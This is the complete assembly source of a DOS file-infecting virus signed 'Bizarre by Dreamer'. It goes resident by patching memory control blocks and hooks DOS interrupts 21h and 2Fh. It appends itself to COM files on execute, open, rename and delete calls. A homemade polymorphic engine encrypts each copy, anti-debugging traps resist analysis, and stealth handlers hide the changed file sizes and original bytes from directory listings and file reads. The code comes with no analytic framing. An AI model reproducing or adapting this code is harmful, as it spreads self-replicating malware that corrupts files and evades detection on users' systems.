int3            macro
                nop ;db      0CCh            ;Int 3h
#em

b0      equ   1
b1      equ   2
b2      equ   4
b3      equ   8
b4      equ  16
b5      equ  32
b6      equ  64
b7      equ 128

org     100h

                jmp     near initialize
                db      64-5 dup(90h)     ;64 NOP's just for the un-encrypter
                                        ;-3 for: jmp near init
                                        ;-2 for: jmp short unload
                jmp     short unload

move_start      equ $

zahl1           dw      0
zahl2           dw      0

OrgFLen         dw      -100h
OrgSize         dw      size
OldXor          db      0

                db      0       ;reserved
move_end        equ     $-offset move_start

ENCR_START:

UnLoad:         mov     ax,0B0FEh               ;unload and execute original
                mov     ax,ax                   ;program if already installed.
                int     2Fh                     ;(graftabl, func 80FE)
cmplen          equ     $-offset Unload

                jmp     short Load


Load:
                push    cs
                pop     ds

                mov     b flag,0

                call    save_vectors

                mov     ax,1200h                ;DOS internal sevices
                int     2Fh                     ;present?
                inc     al
                jnz     lousy_dos

                mov     ah,30h                  ;Get DOS version
                int     21h

                cmp     al,03h
                jae     ok_dos
lousy_dos:      or      b flag,10000000b
ok_dos:
                mov     si,cs
                db      0EBh,01h,0B4h
                std
                lodsw
                cld
                lodsb
                mov     ds,si
                push    ds
                pop     es

                int3

                call    trap3
                jmp     near fail
                call    trap1
                ret
                call    trap3
                jmp     near fail
                jmp     install

fail:           int     0h
                jmp     short fail

install:        xor     si,si
                lodsb
                cmp     al,'Z'
                jne     fail
                lodsw
                mov     di,si
                lodsw
                sub     ax,pgf
                jc      fail
                stosw
                add     si,12h-(1+2+2)
                mov     di,si
                lodsw
                sub     ax,pgf
                jc      fail
                stosw
                push    ax
                add     ax,_stack
                mov     es,ax

                mov     si,110h
                mov     di,100h
                push    di
                mov     cx,blankz
                mov     al,0
                rep     stosb
                pop     di
                pop     es:[stacksgm]

                mov     cx,size
                rep     movsb

                mov     ds,es   ;a86
                call    set_vectors

                jmp     unload

;##############################################################################
;                  Sub's: Debugging Traps and misleading code
;##############################################################################
;TRAPx:          int3
;                ret

Trap1:          pop     si
                inc     si
                jmp     si

Trap2:          pop     si
                inc     si
                inc     si
                jmp     si

Trap3:          pop     si
                inc     si
                inc     si
                inc     si
                jmp     si

;##############################################################################
;                   Sub's: Check if it's the UnLoad signature
;##############################################################################
Check_EsDi:
                push    ds
                push    si
                push    di

                mov     ds,cs   ;A86
                mov     si,offset UnLoad
                mov     cx,CmpLen
        repe    cmpsb

                pop     di
                pop     si
                pop     ds
                ret

Check_DsSi:
                push    es
                push    si
                push    di

                mov     es,cs   ;A86
                mov     di,offset UnLoad
                mov     cx,CmpLen
        repe    cmpsb

                pop     di
                pop     si
                pop     es
                ret

;##############################################################################
;                       Sub's: Interrupt Vector Oriented
;##############################################################################
getvec:         cli
                xor     bx,bx
                mov     es,bx
                mov     bl,al
                shl     bx,1
                shl     bx,1
                les     bx,es:[bx]
                sti
                ret

setvec:         cli
                push    bx
                push    es
                xor     bx,bx
                mov     es,bx
                mov     bl,al
                shl     bx,1
                shl     bx,1
                mov     es:[bx],dx
                mov     es:[bx+2],ds
                pop     es
                pop     bx
                sti
                ret

save_vectors:   ;*** DS must be set to CS ***

                mov     al,2Fh          ;Multiplex
                call    getvec
                mov     old2F[0],bx
                mov     old2F[2],es

                mov     al,21h          ;DOS Universal
                call    getvec
                mov     old21[0],bx
                mov     old21[2],es

                ret

set_vectors:    ;*** DS must be set to HISEG-ES ***

                mov     al,2Fh          ;Multiplex
                mov     dx,offset ni2F
                call    setvec

                mov     al,21h          ;DOS Universal
                mov     dx,offset ni21
                call    setvec

                ret

;##############################################################################
;                       Sub: Get original Int 13h Vector
;                                (Undocumented)
;##############################################################################
org13           dw      0,0

get_org13:      push    ax
                push    ds
                push    dx
                push    es
                push    bx

                mov     al,13h
                call    getvec

                mov     ah,13h
                call    int2F
                push    bx
                push    es
                call    int2F
                pop     cs:org13[2]
                pop     cs:org13[0]

                pop     bx
                pop     es
                pop     dx
                pop     ds
                pop     ax
                ret

;##############################################################################
;                     Sub: Get address of system file table
;                                (Undocumented)
;##############################################################################
get_fte:        mov     ax,1220h                ;(ax=1220h) get job file
                push    bx                      ;table entry
                push    ax
                call    int2F
                mov     bl,es:[di]
                pop     ax
                sub     al,0Ah                  ;(ax=1216h) get address of
                call    int2F                   ;system file table
                pop     bx
                ret

;##############################################################################
;                          Sub's: PUSH_ALL and POP_ALL
;##############################################################################
tmp_jmp         dw      0

push_all:       pop     cs:tmp_jmp
                push    bp
                push    es
                push    di
                push    bx
                push    ds
                push    si
                push    dx
                push    cx
                push    ax
                jmp     cs:tmp_jmp

pop_all:        pop     cs:tmp_jmp
                pop     ax
                pop     cx
                pop     dx
                pop     si
                pop     ds
                pop     bx
                pop     di
                pop     es
                pop     bp
                jmp     cs:tmp_jmp

;##############################################################################          ;#####
;                Sub: Check if the current PSP belongs to CHKDSK
;
;                     Retn: B0 of FLAG set if positive result
;##############################################################################          ;####
chk_4_CHKDSK:   push    ax
                push    bx
                push    cx
                push    es
                push    di
                push    ds
                push    si

                cld

                and     b cs:flag,255-b0

                mov     ah,62h                  ;get current PSP segment
                call    int21                   ;retn:  BX = psp-seg

                mov     ds,bx
                mov     ds,[002Ch]              ;environment segment
                mov     es,ds

                xor     si,si
                mov     cx,32767
                mov     bx,cx
search_env1:    lodsw
                dec     si
                or      ax,ax
                loopnz  search_env1
                jnz     chk_4_CHKDSK_end

                inc     si
                inc     si
                inc     si

                mov     di,si
                mov     cx,bx
        repnz   scasb
                jnz     chk_4_CHKDSK_end

                sub     di,11
                cmp     w [di],'HC'
                jnz     chk_4_CHKDSK_end
                cmp     w [di+2],'DK'
                jnz     chk_4_CHKDSK_end
                cmp     w [di+4],'KS'
                jnz     chk_4_CHKDSK_end

                or      b cs:flag,b0

chk_4_CHKDSK_end:
                push    si
                push    ds
                push    di
                push    es
                push    cx
                push    bx
                push    ax
                ret


;db              'Mon Dieu!',0

;##############################################################################
;                    Sub's: Critical Error Handler (Int 24h)
;##############################################################################

ni24:           mov     al,3            ;dos 3+, Fail op. and continue...
                iret

old24           dw      0,0

Set24:          pushf
                cli
                push    ax
                push    es
                push    bx
                push    ds
                push    dx

                push    cs
                pop     ds

                mov     al,24h
                call    getvec
                mov     old24[0],bx
                mov     old24[2],es

                mov     dx,offset ni24
                call    setvec

                pop     dx
                pop     ds
                pop     bx
                pop     es
                pop     ax
                sti
                popf
                ret

Reset24:        pushf
                cli
                push    ax
                push    ds
                push    dx

                lds     dx,cs:old24
                mov     al,24h
                call    setvec

                pop     dx
                pop     ds
                pop     ax
                sti
                popf
                ret

;##############################################################################
;                                     -[?]-
;##############################################################################
do_the_file:
                call    kreat
                call    get_fte

                mov     ds,cs   ;A86
                or      flag,b6

                push    es:[di+2]
                push    es:[di+4]

                mov     al,b es:[di+4]
                mov     b oattr,al

                mov     ax,w es:[di+0Dh]
                mov     w otime,ax

                mov     ax,w es:[di+0Fh]
                mov     w odate,ax

                test    b flag,b3
                jnz     com_so_what
                cmp     w es:[di+28h],'OC'
                jne     chk_4_com
                cmp     b es:[di+2Ah],'M'
                je      com_so_what

chk_4_com:      or      b flag,b5

com_so_what:
                call    lseek_0
                call    read_buffer
                jc      error

;                mov     dl,es:[di+5]
;                and     dl,255-b7-b6
;                call    chk_4_disk_full
;                jc      error

                call    lseek_eof

                mov     osize[0],ax
                mov     osize[2],ax

                or      dx,dx           ;size >64k ?
                jnz     error
                cmp     ax,61000        ;size >61000
                ja      error

                mov     OrgFLen,ax

                mov     si,offset buffer
                test    b flag,b5
                jz      not_unk_ft
                cmp     b [si],0EBh     ;JMP short ?
                je      not_unk_ft
                cmp     b [si],0E9h     ;JMP near ?
                je      not_unk_ft
                cmp     b [si],0E8h     ;CALL near ?
                jne     error
not_unk_ft:
                cmp     w [si],'ZM'             ;EXE? (MZ=Mark Zbikowski)
                je      error
                cmp     w [si],'MZ'             ;EXE?
                je      error
                cmp     w [si],0FFFFh           ;Device driver?
                je      error

                add     si,64
                call    check_zahlen
                je      error

;                call    Check_DsSi
;                je      error

                or      b flag,b4

                and     b es:[di+2],11111000b   ;read/write mode (2)
                or      b es:[di+2],2 ;00000010b

                call    lseek_eof
                call    write_buffer
                jnc     no_diskfull

                cmp     cx,size
                je      error
                call    restore_old_length
                jmp     error

no_diskfull:
                call    lseek_0
                call    mutate_and_write

                and     flag,255-b6             ;clear error flag
                or      byte ptr odate[1],080h

error:          mov     al,b oattr
                mov     b es:[di+4],al

                mov     ax,w otime
                mov     w es:[di+0Dh],ax

                mov     ax,w odate
                mov     w es:[di+0Fh],ax

                test    b cs:flag,b4
                jz      no_write_attempt
                or      b es:[di+6],40h

no_write_attempt:
                mov     ah,3Eh
                call    int21

                pop     es:[di+4]
                pop     es:[di+2]

                ret


lseek_0:        mov     al,00h
                jmp     lseek_zero_CxDx
lseek_eof:      mov     al,02h
lseek_zero_CxDx:xor     cx,cx
                xor     dx,dx
lseek:          mov     ah,42h
                call    int21
                ret

read_buffer:    mov     ah,3Fh
rw_the_same:    mov     cx,size
                mov     dx,offset buffer
                call    int21
                jc      read_buffer_cy
                cmp     ax,size
                jne     read_buffer_cyX
                clc
                ret
read_buffer_cyX:mov     cx,ax
read_buffer_cy: stc
                ret

write_buffer:   mov     ah,40h
                jmp     rw_the_same

mutate_and_write:
                push    es
                push    di

                mov     es,cs   ;A86

                mov     si,move_start
                mov     di,offset buffer+64
                movsw
                movsw
                movsw
                movsw
                movsw

                call    mute

                mov     si,offset unload ;encr_start
                mov     di,offset buffer+64+10
                mov     cx,encr_len
                call    workspace_c

                pop     di
                pop     es

                call    write_buffer
                ret

restore_old_length:
                mov     ax,osize[0]
                mov     w es:[di+11h],ax
                mov     ax,osize[2]
                mov     w es:[di+13h],ax
                mov     ax,4202h
                xor     cx,cx
                xor     dx,dx
                call    int21
                mov     ah,40h
                xor     cx,cx
                xor     dx,dx
                call    int21
                ret

check_zahlen:
                push    ax
                mov     ax,buffer[(offset zahl1-100h)]
                add     ax,buffer[(offset zahl2-100h)]

                cmp     ax,8512
                pop     ax
                ret
                db 0
text            db 'Bizarre by Dreamer',0
tlen    equ $-offset text

;##############################################################################
;                       Sub: Call the old Int 21h vector
;##############################################################################
int21:          pushf
                call    dword ptr cs:old21
                ret

;##############################################################################
;                       Sub: Call the old Int 2Fh vector
;##############################################################################
int2F:          pushf
                call    dword ptr cs:old2F
                ret

;##############################################################################
;                          Multiplex Handler (Int 2Fh)
;##############################################################################
ni2F:           pushf
                cmp     ax,0B0FEh
                jne     Not_2F_B0FE

                push    bp
                mov     bp,sp

                push    di
                push    es

                mov     es,[bp+6]
                mov     di,[bp+4]

                sub     di,7

                mov     ax,es:zahl1
                add     ax,es:zahl2
                cmp     ax,8512
                jne     Not_2F_B0FE_Fixup

;               call    Check_EsDi
;               jne     Not_2F_B0FE_Fixup

                mov     di,100h
                mov     [bp+4],di

                mov     si,es
                mov     ds,si
                mov     si,OrgFLen
                add     si,di
                mov     cx,OrgSize
                cld
                rep     movsb

                add     sp,2+2+2+2      ;bp,es,di,flags
                xor     ax,ax
                xor     bx,bx
                xor     cx,cx
                xor     dx,dx
                xor     si,si
                xor     di,di
                iret

Not_2F_B0FE_Fixup:
                mov     ax,0B0FEh
                pop     es
                pop     di
                pop     bp
Not_2F_B0FE:    popf
                db      0EAh    ;JMPF...
old2F           dw      0,0


text_Do_You     db 'Do You Believe?',0

KREAT:
push    ax
push    bx

mov     bx,8512
mov     cl,05h
mov     ah,0
db      0e4h,40h
shl     ax,cl
sub     bx,ax

mov     cs:zahl1,ax
mov     cs:zahl2,bx

pop     bx
pop     ax
ret

;##############################################################################
;                    Stealth Int 21, 3Fh (Read from handle)
;##############################################################################
stealth_213F:   popf
                pushf
                jcxz    back_213F
                cmp     bx,5
                jae     okey_213F
back_213F:
                and     cs:flag,255-b2
                popf
                jmp     dword ptr cs:[old21]

okey_213F:      cmp     b cs:flag_213F,0
                jne     back_213F

                call    save_fakestack

                mov     cs:read_ofsbuf[2],ds
                mov     ds,cs   ;A86
                mov     byte ptr flag_213F,1
                mov     read_ofsbuf[0],dx
                mov     read_bytes,cx
                mov     word ptr read_bytes_rtn,0
                mov     word ptr read_handle,bx

                mov     ax,4201h
                xor     cx,cx
                xor     dx,dx
                call    int21

                mov     read_floc[0],ax
                mov     read_floc[2],dx

                mov     ax,4200h
                xor     cx,cx
                mov     dx,40h
                call    int21

                mov     ah,3Fh
                mov     cx,8 ;10
                mov     dx,offset read_zahl1
                call    int21

                mov     ax,4202h
                xor     cx,cx
                xor     dx,dx
                int     21h
                cmp     dx,0
                je      read_sb64k
                mov     ax,0FFFFh
read_sb64k:
                mov     dx,w read_vsize
                add     dx,w read_saveloc
                cmp     ax,dx
                jb      read_nstealth1

                mov     ax,w read_zahl1
                add     ax,w read_zahl2
                cmp     ax,8512
                je      stealth_it

read_nstealth1: call    go_to_floc

                call    rest_fakestack

                mov     b cs:flag_213F,0
                jmp     back_213F

stealth_it:
                mov     dx,read_floc[0]
                mov     cx,read_floc[2]
                mov     ax,w read_vsize

                cmp     cx,0
                jne     read_nstealth1

                cmp     dx,ax
                jbe     step_1
                jmp     step_2
step_1:
                mov     cx,read_bytes
                sub     ax,dx

                cmp     ax,cx
                ja      step_1a

                mov     cx,ax
step_1a:
                mov     ax,4200h
                push    cx
                xor     cx,cx
                add     dx,w read_saveloc
                call    int21
                pop     cx

                add     read_bytes_rtn,cx
                sub     read_bytes,cx
                add     read_floc[0],cx
                adc     read_floc[2],0          ;<-- del'it!

                mov     ah,3Fh
                push    ds
                lds     dx,read_ofsbuf[0]
                push    cx
                call    int21
                pop     cx
                pop     ds
                add     read_ofsbuf[0],cx

step_2:         mov     cx,read_bytes
                jcxz    dont_read_last

                mov     ax,read_floc[0]
                mov     dx,read_floc[2]
                add     ax,cx
                adc     dx,0
                cmp     dx,0
                jne     read_last

                mov     cx,w read_saveloc
                cmp     ax,cx
                jb      read_last

        mov     ax,read_floc[0]
                cmp     ax,cx
                jae     skip_orig_bytes

                call    go_to_floc

                sub     cx,ax
                add     read_bytes_rtn,cx
                sub     read_bytes,cx
                add     read_floc[0],cx
                adc     read_floc[2],0

                mov     ah,3Fh
                push    ds
                lds     dx,read_ofsbuf[0]
                call    int21
                pop     ds

                add     read_ofsbuf[0],ax

skip_orig_bytes:
                mov     ax,w read_vsize
                add     read_floc[0],ax
                adc     read_floc[2],0

read_last:      call    go_to_floc
                mov     cx,read_bytes
                jcxz    dont_read_last

                sub     read_bytes,cx

                mov     ah,3Fh
                push    ds
                lds     dx,read_ofsbuf[0]
                call    int21
                pop     ds
                add     read_bytes_rtn,ax
                add     read_floc[0],ax
                adc     read_floc[2],0
                add     read_ofsbuf[0],ax

dont_read_last:
                call    go_to_floc

                mov     b cs:flag_213F,0

                call    rest_fakestack

                mov     ax,cs:read_bytes_rtn
                and     cs:flag,255-b2
                popf
                clc
                retf    2

go_to_floc:     push    ax
                push    cx
                push    dx

                mov     ax,4200h
                mov     dx,read_floc[0]
                mov     cx,read_floc[2]
                call    int21

                pop     dx
                pop     cx
                pop     ax
                ret



save_fakestack:
                mov     cs:__ax,ax
                mov     cs:__bx,bx
                mov     cs:__cx,cx
                mov     cs:__dx,dx
                mov     cs:__si,si
                mov     cs:__di,di
                mov     cs:__bp,bp
                mov     cs:__es,es
                mov     cs:__ds,ds
                ret

rest_fakestack:
                mov     ax,cs:__ax
                mov     bx,cs:__bx
                mov     cx,cs:__cx
                mov     dx,cs:__dx
                mov     si,cs:__si
                mov     di,cs:__di
                mov     bp,cs:__bp
                mov     es,cs:__es
                mov     ds,cs:__ds
                ret

;##############################################################################
;                             My own 'Polymorpher'
;##############################################################################
random  macro
        db      0E4h,40h
#em

mc_0            db 0,4,2,6              ;al,ah,dl,dh
mc_epush        db 0,2                  ;ax,dx
mc_ppush        db 56h,57h,53h          ;si,di,bx
mc_pinit        db 0BEh,0BFh,0BBh       ;si,di,bx
mc_methp        db 004h,005h,007h       ;si,di,bx
mc_meth         db 000h,028h,030h       ;add,sub,xor
mc_ometh        db 028h,000h,030h       ;add,sub,xor


workspace_c:    db 0B4h ;mov ah,val
workspace000    db 0    ;encryption key
workspace000b:  lodsb
workspace001    db 0    ;add/sub/xor ...
                db 0E0h ;... AL,AH
workspace002    dw 9090h
                stosb
                loop    workspace000b
                ret

mute:           push    es
                push    bx
                push    di

                cli
                mov     es,cs   ;A86
                mov     ds,cs   ;A86

                mov     di,offset workspace
                mov     cx,workspace_len
                cld
                mov     al,90h
                rep     stosb

                mov     w ofs,offset buffer

                call    mc_PUSH
                call    mc_init_regs
                call    mc_decr_rout
                call    mc_POP
                call    mc_JMP
                sti

                pop     di
                pop     bx
                pop     es
                ret

one_three:
                random
                mov     cl,6
                shr     al,cl
                and     al,1+2
                or      al,al
                jz      one_three
                dec     al
                ret

one_four:
                random
                mov     cl,6
                shr     al,cl
                and     al,1+2
                ret


mc_PUSH:        ;Lager PUSH'ene

                mov     di,ofs
                call    mc_add_dummy
                add     w ofs,3
        mov     ofs_mut3,di
                mov     w [di],0000h    ;01010000:0101000b      ;PUSH
                mov     b [di+2],00h    ;01010000b              ;PUSH

                call    one_four
                mov     r_encr_key,al

                shr     al,1            ;finne ut om det er AX eller DX

                mov     ah,al
                mov     bl,al
                mov     bh,0
                mov     dl,mc_epush[bx]

                call    one_three
                mov     bl,al
                mov     bh,0
                or      dl,50h
                or      b [di+bx],dl

                mov     dl,51h

                call    one_four
                shr     al,1
                cmp     al,0
                je      cx_last

                xor     bx,bx
                cmp     b [di],0
                je      cx_first
                inc     bx
cx_first:       mov     b [di+bx],dl
                jmp     cx_done

cx_last:        mov     bx,2
                cmp     b [bx+di],0
                je      cx__last
                dec     bx
cx__last:       mov     b [bx+di],dl

cx_done:
                call    one_three
                mov     r_encr_ptr,al
                mov     bl,al
                mov     al,mc_ppush[bx]

                cmp     b [di],0
                je      ppush_put
                inc     di
                cmp     b [di],0
                je      ppush_put
                inc     di
ppush_put:      stosb

                mov     di,ofs
                call    mc_add_dummy
                ret

mc_POP:         mov     di,ofs
                call    mc_add_dummy
                inc     di
                inc     di
                add     w ofs,3

                mov     si,ofs_mut3
                mov     cx,3
mc_POP2:        lodsb
                std
                or      al,8
                stosb
                cld
                loop    mc_POP2

                mov     di,ofs
                call    mc_add_dummy
                ret

MC_init_regs:   call    one_four
                shr     al,1
                jz      mc_init_regs_keyfirst
                call    mc_putothreg
                call    mc_putkeyreg
                jmp     mc_init_regs_done

mc_init_regs_keyfirst:
                call    mc_putkeyreg
                call    mc_putothreg
mc_init_regs_done:
                ret

mc_putkeyreg:   mov     di,ofs
                call    mc_add_dummy
                add     w ofs,2

                mov     bl,r_encr_key
                mov     al,mc_0[bx]
                or      al,0B0h         ;mov 8bit-reg,val
                stosb
mc_putkeyreg0:  random
                or      al,al
                jz      mc_putkeyreg0
                stosb
                mov     workspace000,al
                ret

mc_putothreg:   mov     di,ofs
                call    mc_add_dummy
                add     w ofs,6

                call    one_four
                shr     al,1
                jz      mc_putothreg_1  ;cx,PTREG / PTREG,cx

                call    mc_putothreg_cx
                call    mc_putothreg_ptreg
                jmp     mc_putothreg_done
mc_putothreg_1: call    mc_putothreg_cx
                call    mc_putothreg_ptreg
mc_putothreg_done:
                ret

mc_putothreg_cx:
                call    mc_add_dummy
                mov     al,0b9h         ;mov CX,val
                stosb
                mov     ax,encr_len
                stosw
                ret

mc_putothreg_ptreg:
                call    mc_add_dummy
                mov     bl,r_encr_ptr
                mov     al,mc_pinit[bx]
                stosb
                mov     ax,encr_start
                stosw
                ret

mc_decr_rout:   mov     di,ofs
                mov     ofs_mut5,di
                add     w ofs,2

                call    mc_add_dummy

                call    one_three
                mov     r_encr_meth,al
                mov     bl,al
                mov     al,mc_meth[bx]
                stosb
                mov     al,mc_ometh[bx]
                mov     workspace001,al

                mov     bl,r_encr_key
                mov     al,mc_0[bx]
                mov     cl,3
                shl     al,cl
                mov     bl,r_encr_ptr
                or      al,mc_methp[bx]
                stosb

                call    one_four
                shr     al,1
                jz      mc_decr_rout_p1
                call    mc_decr_rout_p_PtrI
                call    mc_decr_rout_p_EKeyC
                jmp     mc_decr_rout_done
mc_decr_rout_p1:
                call    mc_decr_rout_p_EKeyC
                call    mc_decr_rout_p_PtrI
mc_decr_rout_done:
                mov     di,ofs
                call    mc_add_dummy
                add     w ofs,2

                mov     al,0E2h
                stosb
                mov     ax,di
                dec     ax
                sub     ax,ofs_mut5
                neg     al
                dec     al
                dec     al
                stosb

;                call    mc_add_dummy

                ret

mc_decr_rout_p_PtrI:
                mov     di,ofs
                call    mc_add_dummy
                inc     w ofs

                mov     bl,r_encr_ptr
                mov     al,mc_ppush[bx]
                and     al,255-10h
                stosb
                ret

mc_decr_rout_p_EKeyC:
                mov     workspace002,9090h

                mov     di,ofs
                call    mc_add_dummy

                call    one_four
                shr     al,1
                jnz     mc_decr_rout_p_EKeyC_no

                add     w ofs,2

                mov     al,0FEh
                stosb
                mov     byte workspace002[0],al

                call    one_four
                shr     al,1
                mov     cl,3
                shl     al,cl
                push    ax
                mov     r_encr_key_cmth,al
                or      al,0C0h

                mov     bl,r_encr_key
                or      al,mc_0[bx]
                stosb
                pop     ax
                or      al,0C4h
                mov     byte workspace002[1],al

mc_decr_rout_p_EKeyC_no:
                ret

MC_JMP:         mov     di,ofs
                mov     ax,di
                mov     al,0EBh
                stosb
                mov     bx,di
                sub     bx,offset buffer
                mov     ax,4Ah
                sub     ax,bx
                dec     ax
                stosb
                add     ofs,2

                ret


twobytes db 089h,0C0h,089h,0DBh,089h,0C9h,089h,0D2h,089h,0F6h,089h,0FFh,088h
        db 0C0h,088h,0E4h,088h,0DBh,088h,0FFh,088h,0C9h,088h,0EDh,088h,0D2h
        db 088h,0F6h,050h,058h,053h,05Bh,051h,059h,052h,05Ah,056h,05Eh,057h
        db 05Fh,01Eh,01Fh,006h,007h,040h,048h,043h,04Bh,041h,049h,042h,04Ah
        db 046h,04Eh,047h,04Fh,048h,040h,04Bh,043h,049h,041h,04Ah,042h,04Eh
        db 046h,04Fh,047h,093h,093h,091h,091h,092h,092h,096h,096h,097h,097h
        db 095h,095h,087h,0DBh,087h,0C9h,087h,0D2h,087h,0F6h,087h,0FFh,087h
        db 0EDh,086h,0C0h,086h,0E4h,086h,0DBh,086h,0FFh,086h,0C9h,086h,0EDh
        db 086h,0D2h,086h,0F6h,0EBh,000h,075h,000h,074h,000h,072h,000h,073h
        db 000h,077h,000h,076h,000h,073h,000h,0E3h,000h,07Fh,000h,07Eh,000h
        db 0FAh,0FBh,0F9h,0F8h,0FDh,0FCh,004h,000h,02Ch,000h,034h,000h,00Ch
        db 000h

g2:     push    ax
g2b:    db      0e4h,40h
        shr     al,1
        shl     al,1
        cmp     al,142
        ja      g2b
        mov     ah,0
        mov     si,offset twobytes
        add     si,ax
        pop     ax
        ret

mc_add_dummy:
        push    si
        call    g2
        add     ofs,2
        pushf
        cld
        movsw
        popf
        pop     si
        ret

;##########

find4:
        call    push_all
        xor     di,di
        call    int21
        jc      dirfail
        mov     si,1Ah
        jmp     get_dta
findfcb:
        call    push_all
        call    int21
        test    al,al
        jnz     dirfail

        mov     di,1
        mov     si,dx
        lodsb
        inc     al
        jnz     not_extended

        mov     di,8
not_extended:
        lea     si,[di+1Ch]
get_dta:
        mov     ah,2Fh
        call    int21
        push    es
        pop     ds
        mov     al,[bx+di+18h]
        test    al,80h
        jz      no_carry
        and     b [bx+di+18h],255-80h

        mov     ax,[bx+si]
        mov     di,[bx+si+2]
        sub     ax,size
        sbb     di,0
        jc      no_carry

        mov     [bx+si],ax
        mov     [bx+si+2],di
no_carry:
        pop     cx
        clc
        jmp     dirsux

dirfail:
        pop     ax
        stc
dirsux: pop     cx
        pop     dx
        pop     si
        pop     ds
        pop     bx
        pop     di
        pop     es
        pop     bp
        jnc      dirtrick

        popf
        jmp     jfa

dirtrick:
        popf
        xor     ax,ax
        sti
        retf    2
;##############################################################################
;                            Dos Universal (Int 21h)
;##############################################################################

flag            db 0

; (toggles)     b0 = PSP belongs to CHKDSK (Don't try to stealth ANYTHING)
;               b1 = use INT 2Fh,13h to find orig Int 13h
;               b2 = ni21 busy
;               b3 = target file was EXEC'ed
;               b4 = file passed test #1
;               b5 = unkown file type
;               b6 = file operation error
;               b7 = all operation cancelled ("drop dead"-mode)

;flag2           db 0

_findfcb:       jmp     findfcb
_find4:         jmp     find4

ni21:           pushf
                cmp     ah,11h
                je      _findfcb
                cmp     ah,12h
                je      _findfcb
                cmp     ah,4Eh
                je      _find4
                cmp     ah,4Fh
                je      _find4

                test    cs:flag,b7
                jnz     drop_dead

                test    cs:flag,b2
                jz      ni21_ok_to_use
drop_dead:      jmp     back

ni21_ok_to_use: or      cs:flag,b2
                and     cs:flag,255-b0-b3-b4-b5-b6

                cmp     ah,3Fh
                jne     nstealth_213F
                jmp     stealth_213F
nstealth_213F:
                cli
                mov     cs:__ss,ss
                mov     cs:__sp,sp
                mov     cs:[0],cs
                mov     ss,cs:stacksgm
                mov     sp,__stack+0FEh
                sti

                call    push_all
                call    set24

        ;57 00/01       ;get/set file-date & time
        ;42 00/01/02    ;move file pointer
        ;3F             ;read from handle (file)

        ;11,12          ;find first / next using FCB's
        ;4E,4F          ;find first / next using ASCIIZ

                cmp     ah,3Eh                  ;close handle?
                jne     vvv
                cmp     bx,5
                jb      exit
DupHandle:      mov     ah,45h                  ;duplicate handle
                jmp     short doit

vvv:            cmp     ah,41h                  ;delete file? (unlink)
                je      open_DsDx

                cmp     ah,43h                  ;change file attr? (chmod)
                je      open_DsDx

                cmp     ah,56h                  ;rename?
                je      open_DsDx

;this makes a   >cmp     ah,57h                  ;get/set file time/date?
;COPY do 0 files>je      DupHandle

                cmp     ax,4B00h                ;exec?
                jne     exit
                or      cs:flag,b3

open_DsDx:      mov     ax,3D00h                ;open file
doit:           call    int21
                jc      exit
                xchg    bx,ax

                call    do_the_file

exit:           call    reset24
                call    pop_all

                cli
                mov     ss,cs:__ss
                mov     sp,cs:__sp
                sti

back21:         and     cs:flag,255-b2
back:           popf
JFA:            db      0EAh    ;JMPF
old21           dw      0,0

counter1C       dw      0

;ni1C:           pushf
;                cmp     cs:counter1C,0
;                je      ni1C_0
;                dec     cs:counter1C
;ni1C_0:         popf
;                db 0EAh
;old1C           dw 0,0

ENCR_LEN        equ $-offset ENCR_START


total:
size    equ $-100h

stacksgm        dw 0

__ss    dw 0
__sp    dw 0

oattr   db 0
otime   dw 0
odate   dw 0
osize   dw 0,0

__ax    dw 0
__bx    dw 0
__cx    dw 0
__dx    dw 0
__si    dw 0
__di    dw 0
__bp    dw 0
__es    dw 0
__ds    dw 0

flag_213F   db 0

read_handle     dw 0
read_bytes      dw 0
read_bytes_rtn  dw 0
read_ofsbuf     dw 0,0
read_floc       dw 0,0

read_zahl1      dw 0    ;sig1
read_zahl2      dw 0    ;sig2
read_saveloc    dw 0    ;ofs to saved bytes
read_vsize      dw 0    ;size of v
read_xor        db 0    ;encryption key to org bytes (not in use)


workspace:
r_encr_key      db 0    ; 0 - 3          al,ah,dl,dh
r_encr_key_cmth db 0    ; 0 / 8          inc / dec
r_encr_meth     db 0    ; 0 - 2          add,sub,xor
r_encr_ptr      db 0    ; 0 - 2          si,di,bx
ofs_mut3        dw 0    ;regs get PUSH'ed
ofs_mut5        dw 0    ;start of loop

ofs             dw offset buffer
buffer          db 64 dup(90h)
workspace_len   equ $-offset workspace

_stack   equ 1024/16    ; in para
__stack  equ 1024-16    ; in bytes

blankz  equ $-100h

pgf     equ ((($+32)/16)*2)+_stack

;------------------* The following is NOT a part of the code *-----------------

initialize:
                mov     w [100h],9090h
                mov     b [102h],90h

                call    kreat

                mov     si,offset text_do_you
                mov     di,si
initialize_l1:  lodsb
                or      al,al
                jz      initialize_e1
                shl     al,1
                stosb
                jmp     initialize_l1
initialize_e1:
                jmp     near 100h
                